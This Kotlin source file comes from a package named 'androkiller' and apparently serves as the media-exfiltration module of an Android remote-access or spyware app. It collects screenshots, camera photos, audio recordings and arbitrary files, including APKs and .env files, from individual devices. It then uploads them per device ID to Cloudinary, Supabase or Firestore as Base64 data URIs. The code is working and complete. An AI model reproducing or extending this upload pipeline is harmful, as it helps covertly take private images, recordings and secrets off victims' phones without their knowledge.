package com.nexus.androkiller.data

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.util.Base64
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit
import kotlin.math.min

/**
 * Free Storage Providers supported for media (snapshots and audio):
 * 1. INLINE: Encodes compressed media as Base64 Data URI directly into Firestore (100% Free, Zero Setup, No credit card needed).
 * 2. CLOUDINARY: Free tier provides 25GB storage/bandwidth per month with no credit card required.
 * 3. SUPABASE: Free tier provides 1GB S3-compatible bucket storage with no credit card required.
 * 4. FIREBASE: Legacy Google Cloud Storage (requires paid Blaze plan on newer projects).
 */
enum class StorageProvider {
    INLINE,
    CLOUDINARY,
    SUPABASE,
    FIREBASE
}

data class StorageConfig(
    val provider: StorageProvider = StorageProvider.INLINE,
    val cloudinaryCloudName: String = "",
    val cloudinaryUploadPreset: String = "",
    val supabaseUrl: String = "",
    val supabaseAnonKey: String = "",
    val supabaseBucket: String = "media"
)

data class UploadResult(
    val downloadUrl: String,
    val storagePath: String,
    val fileSize: Long,
    val provider: String
)

class FreeStorageManager(private val context: Context) {

    private val prefs = context.getSharedPreferences("nexus_storage_prefs", Context.MODE_PRIVATE)

    @Volatile
    private var config: StorageConfig = loadConfigFromPrefs()

    private val httpClient: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build()
    }

    private fun loadConfigFromPrefs(): StorageConfig {
        val providerStr = prefs.getString("storage_provider", StorageProvider.INLINE.name) ?: StorageProvider.INLINE.name
        val provider = try {
            StorageProvider.valueOf(providerStr)
        } catch (_: Exception) {
            StorageProvider.INLINE
        }

        return StorageConfig(
            provider = provider,
            cloudinaryCloudName = prefs.getString("cloudinary_cloud_name", "") ?: "",
            cloudinaryUploadPreset = prefs.getString("cloudinary_upload_preset", "") ?: "",
            supabaseUrl = prefs.getString("supabase_url", "") ?: "",
            supabaseAnonKey = prefs.getString("supabase_anon_key", "") ?: "",
            supabaseBucket = prefs.getString("supabase_bucket", "media") ?: "media"
        )
    }

    fun updateConfig(newConfig: StorageConfig) {
        config = newConfig
        prefs.edit()
            .putString("storage_provider", newConfig.provider.name)
            .putString("cloudinary_cloud_name", newConfig.cloudinaryCloudName)
            .putString("cloudinary_upload_preset", newConfig.cloudinaryUploadPreset)
            .putString("supabase_url", newConfig.supabaseUrl)
            .putString("supabase_anon_key", newConfig.supabaseAnonKey)
            .putString("supabase_bucket", newConfig.supabaseBucket)
            .apply()
        Log.i(TAG, "Storage config updated: provider=${newConfig.provider.name}")
    }

    fun getConfig(): StorageConfig = config

    /**
     * Uploads media using the active free storage provider.
     * Automatically falls back to compressed Base64 Data URI if external cloud upload fails.
     */
    suspend fun upload(
        file: File,
        type: String, // "IMAGE" or "AUDIO"
        deviceId: String
    ): Result<UploadResult> {
        val activeProvider = config.provider
        val isScreenshot = type.equals("SCREENSHOT", ignoreCase = true)
        val isImage = type.equals("IMAGE", ignoreCase = true) || isScreenshot
        val folder = if (isScreenshot) "screenshots" else if (isImage) "camera" else "audio"
        val storagePath = "devices/$deviceId/$folder/${file.name}"

        Log.i(TAG, "Initiating media upload via provider: ${activeProvider.name} for ${file.name}")

        // 1. Attempt Cloudinary if configured
        if (activeProvider == StorageProvider.CLOUDINARY && config.cloudinaryCloudName.isNotBlank()) {
            val result = uploadToCloudinary(file, config.cloudinaryCloudName, config.cloudinaryUploadPreset)
            if (result.isSuccess) {
                return Result.success(
                    UploadResult(
                        downloadUrl = result.getOrThrow(),
                        storagePath = storagePath,
                        fileSize = file.length(),
                        provider = "CLOUDINARY"
                    )
                )
            } else {
                Log.w(TAG, "Cloudinary upload failed: ${result.exceptionOrNull()?.message}. Falling back to Free Inline mode.")
            }
        }

        // 2. Attempt Supabase if configured
        if (activeProvider == StorageProvider.SUPABASE && config.supabaseUrl.isNotBlank()) {
            val result = uploadToSupabase(file, config.supabaseUrl, config.supabaseAnonKey, config.supabaseBucket, storagePath)
            if (result.isSuccess) {
                return Result.success(
                    UploadResult(
                        downloadUrl = result.getOrThrow(),
                        storagePath = storagePath,
                        fileSize = file.length(),
                        provider = "SUPABASE"
                    )
                )
            } else {
                Log.w(TAG, "Supabase upload failed: ${result.exceptionOrNull()?.message}. Falling back to Free Inline mode.")
            }
        }

        // 3. Free Zero-Config Inline Mode (Works 100% on Firebase Spark Free Plan without payment)
        return try {
            val dataUri = when {
                isImage -> compressImageToBase64DataUri(file, maxDimension = 1024, quality = 70)
                type.equals("AUDIO", ignoreCase = true) -> encodeAudioToBase64DataUri(file)
                else -> encodeGenericFileToBase64DataUri(file)
            }

            Log.i(TAG, "Free Inline Data URI prepared for ${file.name} (length: ${dataUri.length} chars)")
            Result.success(
                UploadResult(
                    downloadUrl = dataUri,
                    storagePath = storagePath,
                    fileSize = file.length(),
                    provider = "FREE_INLINE"
                )
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to encode media to inline data URI: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Encodes generic files (documents, APKs, archives) to Data URI with accurate MIME type.
     */
    private fun encodeGenericFileToBase64DataUri(file: File): String {
        val maxInlineBytes = 750 * 1024L // 750 KB safe limit for Firestore 1MB doc ceiling
        if (file.length() > maxInlineBytes) {
            throw IllegalStateException("File size (${file.length() / 1024} KB) exceeds free inline limit of 750 KB. Configure Cloudinary or Supabase in Storage Settings for larger transfers.")
        }
        val bytes = file.readBytes()
        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        val mimeType = getMimeTypeForFile(file)
        return "data:$mimeType;base64,$base64"
    }

    private fun getMimeTypeForFile(file: File): String {
        return when (file.extension.lowercase()) {
            "apk" -> "application/vnd.android.package-archive"
            "zip" -> "application/zip"
            "rar" -> "application/x-rar-compressed"
            "gz", "tgz" -> "application/gzip"
            "pdf" -> "application/pdf"
            "json" -> "application/json"
            "txt", "log", "env", "css", "ts", "js" -> "text/plain"
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "mp4" -> "video/mp4"
            "m4a", "aac" -> "audio/mp4"
            "mp3" -> "audio/mpeg"
            else -> "application/octet-stream"
        }
    }

    /**
     * Compresses and downsamples camera photo to a lightweight JPEG and encodes to Data URI.
     * Shrinks 3-8MB camera images down to ~50-100KB, fitting comfortably inside Firestore document limit (1MB).
     */
    private fun compressImageToBase64DataUri(file: File, maxDimension: Int = 1024, quality: Int = 70): String {
        val boundsOptions = BitmapFactory.Options().apply { inJustDecodeBounds = true }
        BitmapFactory.decodeFile(file.absolutePath, boundsOptions)

        val origWidth = boundsOptions.outWidth
        val origHeight = boundsOptions.outHeight

        var sampleSize = 1
        if (origWidth > maxDimension || origHeight > maxDimension) {
            val halfWidth = origWidth / 2
            val halfHeight = origHeight / 2
            while ((halfWidth / sampleSize) >= maxDimension && (halfHeight / sampleSize) >= maxDimension) {
                sampleSize *= 2
            }
        }

        val decodeOptions = BitmapFactory.Options().apply {
            inSampleSize = sampleSize
            inPreferredConfig = Bitmap.Config.RGB_565 // 16-bit color saves 50% memory
        }

        val decodedBitmap = BitmapFactory.decodeFile(file.absolutePath, decodeOptions)
            ?: throw IOException("Failed to decode image file at ${file.absolutePath}")

        // Scale down if still slightly above maxDimension
        val maxDecoded = maxOf(decodedBitmap.width, decodedBitmap.height)
        val finalBitmap = if (maxDecoded > maxDimension) {
            val scale = maxDimension.toFloat() / maxDecoded
            Bitmap.createScaledBitmap(
                decodedBitmap,
                (decodedBitmap.width * scale).toInt(),
                (decodedBitmap.height * scale).toInt(),
                true
            )
        } else {
            decodedBitmap
        }

        val outputStream = ByteArrayOutputStream()
        finalBitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
        val compressedBytes = outputStream.toByteArray()

        if (finalBitmap != decodedBitmap) {
            finalBitmap.recycle()
        }
        decodedBitmap.recycle()

        val base64 = Base64.encodeToString(compressedBytes, Base64.NO_WRAP)
        return "data:image/jpeg;base64,$base64"
    }

    /**
     * Encodes audio (.m4a/.aac) to Data URI.
     */
    private fun encodeAudioToBase64DataUri(file: File): String {
        val bytes = file.readBytes()
        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        val mimeType = if (file.name.endsWith(".m4a", ignoreCase = true)) "audio/mp4" else "audio/aac"
        return "data:$mimeType;base64,$base64"
    }

    /**
     * Upload to Cloudinary using unsigned upload preset (Free 25GB/month tier).
     */
    private fun uploadToCloudinary(file: File, cloudName: String, preset: String): Result<String> {
        return try {
            val isImage = file.name.endsWith(".jpg", ignoreCase = true) || file.name.endsWith(".png", ignoreCase = true)
            val mediaType = if (isImage) "image/jpeg".toMediaType() else "audio/mp4".toMediaType()

            val bodyBuilder = MultipartBody.Builder().setType(MultipartBody.FORM)
            if (preset.isNotBlank()) {
                bodyBuilder.addFormDataPart("upload_preset", preset)
            }
            bodyBuilder.addFormDataPart("file", file.name, file.asRequestBody(mediaType))

            val uploadUrl = "https://api.cloudinary.com/v1_1/$cloudName/auto/upload"
            val request = Request.Builder()
                .url(uploadUrl)
                .post(bodyBuilder.build())
                .build()

            val response = httpClient.newCall(request).execute()
            val responseBody = response.body?.string() ?: ""

            if (!response.isSuccessful) {
                return Result.failure(IOException("Cloudinary HTTP ${response.code}: $responseBody"))
            }

            val json = JSONObject(responseBody)
            val secureUrl = json.optString("secure_url", "")
            if (secureUrl.isNotBlank()) {
                Result.success(secureUrl)
            } else {
                Result.failure(IOException("No secure_url found in Cloudinary response: $responseBody"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    /**
     * Upload to Supabase Storage REST API (Free 1GB tier).
     */
    private fun uploadToSupabase(
        file: File,
        supabaseUrl: String,
        anonKey: String,
        bucket: String,
        storagePath: String
    ): Result<String> {
        return try {
            val isImage = file.name.endsWith(".jpg", ignoreCase = true) || file.name.endsWith(".png", ignoreCase = true)
            val mediaType = if (isImage) "image/jpeg".toMediaType() else "audio/mp4".toMediaType()

            val baseUrl = supabaseUrl.trimEnd('/')
            val uploadUrl = "$baseUrl/storage/v1/object/$bucket/$storagePath"

            val request = Request.Builder()
                .url(uploadUrl)
                .addHeader("apikey", anonKey)
                .addHeader("Authorization", "Bearer $anonKey")
                .addHeader("x-upsert", "true")
                .post(file.asRequestBody(mediaType))
                .build()

            val response = httpClient.newCall(request).execute()
            val responseBody = response.body?.string() ?: ""

            if (!response.isSuccessful && response.code != 200 && response.code != 201) {
                return Result.failure(IOException("Supabase HTTP ${response.code}: $responseBody"))
            }

            val publicUrl = "$baseUrl/storage/v1/object/public/$bucket/$storagePath"
            Result.success(publicUrl)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    companion object {
        private const val TAG = "FreeStorageManager"
    }
}
